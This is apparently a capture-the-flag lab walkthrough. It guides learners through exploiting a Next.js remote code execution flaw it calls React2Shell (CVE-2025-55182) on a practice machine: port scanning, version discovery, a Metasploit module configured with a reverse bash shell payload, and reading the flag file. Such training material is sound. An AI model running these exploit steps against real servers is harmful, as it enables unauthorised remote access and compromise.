# React2Shell CTF Challenge

Welcome! In this challenge, you'll be exploring a vulnerable Ubuntu machine running a web service with a critical security flaw.

**Target IP address:** `_______________`

Your mission: Exploit the vulnerability and capture the flag with the secret code!

---

<details>
<summary><strong>Step 1</strong></summary>

Before diving in, let's do some initial discovery. Start by looking which ports are open on the target machine.

<details>
<summary>Hint</summary>

Tools like `nmap` or `zenmap` are perfect for scanning a machine and finding open ports.

</details>

<details>
<summary>Solution</summary>

Port 3000 should be open, indicating a web service is running.

</details>

</details>

---

<details>
<summary><strong>Step 2</strong></summary>

Now that you've found an open port, take a closer look at the web service. Can you identify what's running and which version it is?

<details>
<summary>Hint</summary>

Normally you might check HTTP headers or look for version info in the page source. In this case, try inspecting the website for clues.

</details>

<details>
<summary>Solution</summary>

The service is a Next.js application running version 16.0.6, which can be found in the footer of the webpage.

</details>

</details>

---

<details>
<summary><strong>Step 3</strong></summary>

Interesting! Now that you know the framework and version, it's time to do some research. Are there any known vulnerabilities for this specific version?
Maybe a quick search on Google or a visit to CVE databases could help.

<details>
<summary>Solution</summary>

There's a critical vulnerability known as "React2Shell" (CVE-2025-55182 / CVE-2025-66478) affecting this version.

</details>

</details>

---

<details>
<summary><strong>Step 4</strong></summary>

Great find! Now let's see if there's an existing exploit we can use. Metasploit might have something useful for us.

<details>
<summary>Hint</summary>

Fire up Metasploit and search for the vulnerability:

```bash
msfconsole
search react2shell
```

</details>

<details>
<summary>Solution</summary>

There's a ready-to-use module: `exploit/multi/http/react2shell_unauth_rce_cve_2025_55182`

</details>

</details>

---

<details>
<summary><strong>Step 5</strong></summary>

Time to set up the exploit! Load the module and configure it properly. The payload `cmd/unix/reverse_bash` will work perfectly for our needs.

<details>
<summary>Hint</summary>

Load the module and check what options need to be configured:

```bash
use exploit/multi/http/react2shell_unauth_rce_cve_2025_55182
set payload cmd/unix/reverse_bash
show options
```

</details>

<details>
<summary>Solution</summary>

Execute the commands above, then
configure the target and your listener:

```bash
set RHOSTS <target-ip>
set RPORT 3000
set LHOST <your-ip>
set LPORT 4444
```

</details>

</details>

---

<details>
<summary><strong>Step 6</strong></summary>

Everything is configured. Let's launch the exploit and see if we can get a shell on the target machine.

<details>
<summary>Hint</summary>

```bash
exploit
```

</details>

</details>

---

<details>
<summary><strong>Step 7</strong></summary>

You should now have access to the target machine. Time to hunt for the flag! It is probably hidden somewhere in the filesystem.

<details>
<summary>Hint</summary>

The flag is hidden somewhere in the filesystem. Try navigating with `cd ..` and look around using `ls`.

</details>

<details>
<summary>Solution</summary>
The flag is located in the root directory. Do the following:

```bash
cd /
cat flag.txt
```

</details>

---

**Well done! You've completed the challenge. What code did you find on the flag?**
